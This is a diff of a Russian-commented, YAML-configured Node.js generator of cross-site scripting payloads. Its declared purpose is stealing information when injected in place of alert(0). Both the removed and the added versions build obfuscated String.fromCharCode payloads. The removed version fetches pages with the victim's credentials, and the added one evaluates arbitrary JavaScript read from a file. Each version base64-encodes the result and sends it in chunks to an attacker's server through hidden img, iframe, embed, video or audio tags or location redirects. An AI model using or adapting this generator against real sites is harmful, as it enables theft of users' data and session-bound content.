@@ -1,5 +1,7 @@
-description: >-
-  Генератор нагрузки для похищения информации с помощью fetch. Внедрять вместо alert(0).
+description: |-
+  Генератор нагрузки для выполнения произвольного кода в браузере. Внедрять вместо alert(0).
+
+  Забирает данные напрямую из eval (плохо подходит для цепочки fetch-eй).
 
   Будет отправлять данные с помощью GET-запросов частями, если их много.
   При эксплуатации с помощью location нужно настроить принимающий сервер на долгий ответ (60000), чтобы перенаправление не произошло до отправки всех данных. 
@@ -8,7 +10,7 @@ tags:
   - xss
   - payload
   - generator
-  - fetch
+  - exec
 
 arguments:
   server-url:
@@ -16,18 +18,11 @@ arguments:
     description: >-
       URL 
     replacer: '#server_url#'
-  
-  fetch-url:
-    default:
-    description: >-
-      URL 
-    replacer: '#fetch_url#'
 
-  o:
-    default: '{"credentials":"include","method":"GET","mode":"cors"}'
+  js-file:
     description: >-
-      опции fetch-запроса
-    replacer: '#fetch_options#'
+      путь до файла с внедряемым JS-кодом
+    replacer: '#jsfile#'
 
   a:
     default:
@@ -65,53 +60,64 @@ arguments:
       - head
     description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
     replacer: '#pos#'
-
+  
+  btoa-fix:
+    default:
+      - 'N'
+      - 'Y'
+    description: кодировать данные с помощью URL encoding перед отправкой в btoa (применять если на выходе eval есть кириллица)
+    replacer: '#btoa-fix#'
 
 mode:
   format:
-    fetch-url: '{0!r}'
     server-url: '{0!r}'
-    o: '{0!r}'
+    js-file: '{0!r}'
     num-param: '{0!r}'
     pld-param: '{0!r}'
     head: '{0!r}'
-
   replace:
-    a:
+    btoa-fix:
+      N: >-
+        btoa(eval(String.fromCharCode(${chars_jscode})))
+      Y: >-
+        btoa(encodeURIComponent(eval(String.fromCharCode(${chars_jscode}))))
+    a:  
       img: |-
         var attackElementStart = `<img src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `" style="display:none">`;
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})"
 
       iframe: |-
         var attackElementStart = `<iframe src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `" style="display:none"></iframe>`;
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})"
       embed: |-
         var attackElementStart = `<embed src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `" style="display:none">`;
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})"
       video: |-
         var attackElementStart = `<video src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `"controls style="display:none"></video>`;
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})"
       audio: |-
         var attackElementStart = `<audio src="${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = `"controls style="display:none"></audio>`;
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c,String.fromCharCode(${chars_attackElementEnd})))})"
       
       location: |
         var attackElementStart = `${serverURL}?${numParam}=`;
         var attackElementMid = `&${payloadParam}=`;
         var attackElementEnd = "";
-        var payloadTemplate = "fetch(String.fromCharCode(${chars_fetchURL}),JSON.parse(String.fromCharCode(${chars_fetchOptions}))).then(function(a){return(a.text())}).then(function(b){btoa(b).match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){setTimeout(function(){if(localStorage.getItem(${randomNumber})==null){localStorage.setItem(${randomNumber},0)}if(localStorage.getItem(${randomNumber})==i){(localStorage.setItem(${randomNumber},i-(-1)),window.location.replace(String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c)))}},${locationDelay}*i)})})"
+        var payloadTemplate = "#btoa-fix#.match(RegExp(String.fromCharCode(${chars_datablockRegex}),String.fromCharCode(103))).forEach(function(c,i){setTimeout(function(){if(localStorage.getItem(${randomNumber})==null){localStorage.setItem(${randomNumber},0)}if(localStorage.getItem(${randomNumber})==i){(localStorage.setItem(${randomNumber},i-(-1)),window.location.replace(String.fromCharCode(${chars_attackElementStart}).concat(i,String.fromCharCode(${chars_attackElementMid}),c)))}},${locationDelay}*i)})"
 shell: node
 script: |-
+  const fs = require('fs');
+
   function MakeCharCode(pld) {
     output_arr = [];
     pld_arr = [...pld];
@@ -123,8 +129,7 @@ script: |-
   };
   
   var serverURL = #server_url#;
-  var fetchURL = #fetch_url#;
-  var fetchOptions = #fetch_options#;
+  var jsfile = #jsfile#;
   var numParam = #num-param#;
   var payloadParam = #payload-param#;
   var position = #pos#;
@@ -132,12 +137,14 @@ script: |-
   var randomNumber = Math.round(Math.random()*1000)
   var locationDelay = #delay#
 
+  // Чтение файла с кодом
+  var jscode = fs.readFileSync(jsfile, { encoding: 'utf8', flag: 'r' });
+  
   // внедряемый элемент
   #agent#
 
   // Кодирование параметров
-  chars_fetchURL = MakeCharCode(fetchURL);
-  chars_fetchOptions = MakeCharCode(fetchOptions);
+  chars_jscode = MakeCharCode(jscode);
   chars_datablockRegex = MakeCharCode(datablockRegex);
 
   // Сборка полной нагрузки
